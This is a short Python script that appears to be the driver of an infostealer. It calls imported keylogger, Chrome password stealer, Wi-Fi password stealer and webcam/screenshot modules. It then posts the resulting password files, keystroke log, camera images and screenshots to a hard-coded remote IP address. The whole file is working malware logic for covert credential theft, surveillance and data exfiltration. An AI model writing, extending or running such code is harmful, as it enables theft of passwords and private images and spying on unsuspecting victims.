from threading import Thread, Timer

import requests as rq
import os
import ChromeStealer
import Keylogger
import Webcam
import WifiStealer

os.chdir('.')

def exit_():
    print('Finished.')
    exit(0)



print('Keylogger started..')
X = Thread(target=Keylogger.keylogger, daemon=True).start()
ChromeStealer.StealPasswords()
WifiStealer.wifiStealer()
Webcam.webcam()
Webcam.screenshot()
t = Timer(3.0, exit_)
t.start()

with open("wifiPasswords.txt", "rb") as wifi, \
        open('chromePasswords.txt', 'rb') as crm,\
        open('camera1.jpg', 'rb') as c1, \
        open('camera2.jpg', 'rb') as c2, \
        open('log.txt', 'rb') as log, \
        open('screenshot1.png', 'rb') as ss1, \
        open('screenshot2.png', 'rb') as ss2:
    file_dict = {"wifi": wifi, 'crm': crm, 'c1': c1, 'c2': c2, 'log': log, 'screenshot1': ss1, 'screenshot2': ss2}
    response = rq.post("http://40.115.36.79:8080/upload", files=file_dict)